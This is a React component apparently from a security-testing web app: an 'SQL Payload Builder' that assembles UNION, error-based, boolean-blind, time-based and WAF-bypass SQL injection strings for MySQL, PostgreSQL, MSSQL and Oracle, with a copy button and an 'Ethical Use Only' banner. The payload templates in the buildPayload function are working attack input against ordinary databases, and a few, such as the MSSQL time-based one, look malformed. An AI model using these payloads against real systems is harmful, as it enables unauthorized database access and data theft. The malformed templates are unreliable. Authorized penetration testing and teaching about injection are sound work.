import React, { useState, useEffect, useCallback, useMemo } from 'react';
import { motion } from 'framer-motion';
import { useTheme } from '../contexts/ThemeContext';
import { FiCopy, FiRefreshCw, FiCode, FiDatabase } from 'react-icons/fi';

const PayloadBuilder = () => {
  const [injectionType, setInjectionType] = useState('union');
  const [database, setDatabase] = useState('mysql');
  const [context, setContext] = useState('string');
  const [columns, setColumns] = useState('3');
  const [table, setTable] = useState('users');
  const [payload, setPayload] = useState('');
  const [copied, setCopied] = useState(false);
  const { isDarkMode } = useTheme();

  const databases = useMemo(() => ({
    mysql: { name: 'MySQL', comment: '-- ', concat: 'CONCAT()', version: 'VERSION()', user: 'USER()' },
    postgresql: { name: 'PostgreSQL', comment: '-- ', concat: '||', version: 'VERSION()', user: 'CURRENT_USER' },
    mssql: { name: 'MS SQL Server', comment: '-- ', concat: '+', version: '@@VERSION', user: 'SYSTEM_USER' },
    oracle: { name: 'Oracle', comment: '-- ', concat: '||', version: 'BANNER', user: 'USER' }
  }), []);

  const buildPayload = useCallback(() => {
    const db = databases[database];
    let builtPayload = '';

    switch (injectionType) {
      case 'union':
        const nulls = Array(parseInt(columns)).fill('NULL').join(',');
        builtPayload = `' UNION SELECT ${nulls.replace('NULL', `'${table}'`).replace('NULL', 'COUNT(*)')} FROM ${table} ${db.comment}`;
        break;
      
      case 'error':
        if (database === 'mysql') {
          builtPayload = `' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT ${db.user}), 0x7e)) ${db.comment}`;
        } else if (database === 'mssql') {
          builtPayload = `' AND 1=CONVERT(int, (SELECT ${db.user})) ${db.comment}`;
        } else {
          builtPayload = `' AND 1=CAST((SELECT ${db.user}) AS int) ${db.comment}`;
        }
        break;
      
      case 'boolean':
        builtPayload = `' AND (SELECT LENGTH(${db.user}))>0 ${db.comment}`;
        break;
      
      case 'time':
        if (database === 'mysql') {
          builtPayload = `' AND IF((SELECT LENGTH(${db.user}))>0, SLEEP(5), 0) ${db.comment}`;
        } else if (database === 'mssql') {
          builtPayload = `' AND IF((SELECT LEN(${db.user}))>0) WAITFOR DELAY '00:00:05' ${db.comment}`;
        } else {
          builtPayload = `' AND CASE WHEN (SELECT LENGTH(${db.user}))>0 THEN pg_sleep(5) ELSE 0 END ${db.comment}`;
        }
        break;
      
      case 'bypass':
        const bypassTechniques = [
          `'/**/UNION/**/SELECT/**/`,
          `' UNION/*!50000SELECT*/`,
          `' UNI%00ON SELECT`,
          `' /*!UNION*/ /*!SELECT*/`
        ];
        builtPayload = bypassTechniques[Math.floor(Math.random() * bypassTechniques.length)] + ` NULL,${db.user},NULL ${db.comment}`;
        break;
      
      default:
        builtPayload = `' OR 1=1 ${db.comment}`;
    }

    // Apply context escaping
    if (context === 'numeric') {
      builtPayload = builtPayload.replace(/^'/, '').replace(/\s--\s*$/, ' -- ');
    } else if (context === 'double_quote') {
      builtPayload = builtPayload.replace(/'/g, '"');
    }

    setPayload(builtPayload);
  }, [injectionType, database, context, columns, table, databases]);

  useEffect(() => {
    buildPayload();
  }, [buildPayload]);

  const handleCopy = () => {
    navigator.clipboard.writeText(payload);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  const generateRandomPayload = () => {
    const types = ['union', 'error', 'boolean', 'time', 'bypass'];
    const dbs = Object.keys(databases);
    const contexts = ['string', 'numeric', 'double_quote'];
    
    setInjectionType(types[Math.floor(Math.random() * types.length)]);
    setDatabase(dbs[Math.floor(Math.random() * dbs.length)]);
    setContext(contexts[Math.floor(Math.random() * contexts.length)]);
    setColumns((Math.floor(Math.random() * 5) + 2).toString());
  };

  return (
    <motion.div
      initial={{ opacity: 0, y: 20 }}
      animate={{ opacity: 1, y: 0 }}
      className={`mt-6 p-6 rounded-lg shadow-lg ${
        isDarkMode 
          ? 'bg-gray-800 bg-opacity-50 border border-gray-700' 
          : 'bg-white bg-opacity-80 border border-gray-200'
      }`}
    >
      <div className="flex items-center justify-between mb-4">
        <h3 className="text-xl font-bold flex items-center">
          <FiCode className="mr-2 text-orange-400" />
          SQL Payload Builder
        </h3>
        <button
          onClick={generateRandomPayload}
          className="flex items-center px-3 py-2 text-sm bg-orange-600 hover:bg-orange-700 rounded-lg transition-colors"
        >
          <FiRefreshCw className="mr-1" />
          Random
        </button>
      </div>

      <div className="grid md:grid-cols-2 gap-6">
        {/* Configuration Panel */}
        <div className="space-y-4">
          <div>
            <label className="block text-sm font-medium mb-2">Injection Type</label>
            <select
              value={injectionType}
              onChange={(e) => setInjectionType(e.target.value)}
              className={`w-full p-2 rounded ${isDarkMode ? 'bg-gray-700' : 'bg-gray-100'}`}
            >
              <option value="union">UNION-Based</option>
              <option value="error">Error-Based</option>
              <option value="boolean">Boolean Blind</option>
              <option value="time">Time-Based</option>
              <option value="bypass">WAF Bypass</option>
            </select>
          </div>

          <div>
            <label className="block text-sm font-medium mb-2">Database Type</label>
            <select
              value={database}
              onChange={(e) => setDatabase(e.target.value)}
              className={`w-full p-2 rounded ${isDarkMode ? 'bg-gray-700' : 'bg-gray-100'}`}
            >
              {Object.entries(databases).map(([key, db]) => (
                <option key={key} value={key}>{db.name}</option>
              ))}
            </select>
          </div>

          <div>
            <label className="block text-sm font-medium mb-2">Injection Context</label>
            <select
              value={context}
              onChange={(e) => setContext(e.target.value)}
              className={`w-full p-2 rounded ${isDarkMode ? 'bg-gray-700' : 'bg-gray-100'}`}
            >
              <option value="string">String Context (')</option>
              <option value="numeric">Numeric Context</option>
              <option value="double_quote">Double Quote (")</option>
            </select>
          </div>

          {injectionType === 'union' && (
            <div>
              <label className="block text-sm font-medium mb-2">Number of Columns</label>
              <input
                type="number"
                min="1"
                max="10"
                value={columns}
                onChange={(e) => setColumns(e.target.value)}
                className={`w-full p-2 rounded ${isDarkMode ? 'bg-gray-700' : 'bg-gray-100'}`}
              />
            </div>
          )}

          <div>
            <label className="block text-sm font-medium mb-2">Target Table</label>
            <input
              type="text"
              value={table}
              onChange={(e) => setTable(e.target.value)}
              className={`w-full p-2 rounded ${isDarkMode ? 'bg-gray-700' : 'bg-gray-100'}`}
              placeholder="e.g., users, admin, accounts"
            />
          </div>
        </div>

        {/* Generated Payload Panel */}
        <div>
          <div className="flex items-center justify-between mb-2">
            <label className="block text-sm font-medium">Generated Payload</label>
            <button
              onClick={handleCopy}
              className="flex items-center px-3 py-1 text-xs bg-blue-600 hover:bg-blue-700 rounded transition-colors"
            >
              <FiCopy className="mr-1" />
              {copied ? 'Copied!' : 'Copy'}
            </button>
          </div>
          
          <div className={`p-4 rounded-lg border-2 border-dashed ${
            isDarkMode ? 'bg-gray-900 border-gray-600' : 'bg-gray-50 border-gray-300'
          }`}>
            <code className="text-sm break-all font-mono text-orange-400">
              {payload || 'Configure options to generate payload...'}
            </code>
          </div>

          <div className="mt-4 space-y-2">
            <div className="flex items-center text-sm">
              <FiDatabase className="mr-2 text-teal-400" />
              <span>Database: <strong>{databases[database].name}</strong></span>
            </div>
            <div className="text-xs text-gray-400">
              <strong>Explanation:</strong> 
              {injectionType === 'union' && ' Uses UNION SELECT to extract data from multiple tables.'}
              {injectionType === 'error' && ' Triggers database errors to leak sensitive information.'}
              {injectionType === 'boolean' && ' Uses boolean conditions to infer data character by character.'}
              {injectionType === 'time' && ' Uses time delays to confirm injection and extract data.'}
              {injectionType === 'bypass' && ' Uses various techniques to bypass Web Application Firewalls.'}
            </div>
          </div>

          <div className="mt-4 p-3 bg-yellow-900/20 border border-yellow-700/50 rounded-lg">
            <p className="text-xs text-yellow-300">
              ⚠️ <strong>Ethical Use Only:</strong> These payloads are for educational purposes and authorized security testing only.
            </p>
          </div>
        </div>
      </div>
    </motion.div>
  );
};

export default PayloadBuilder;
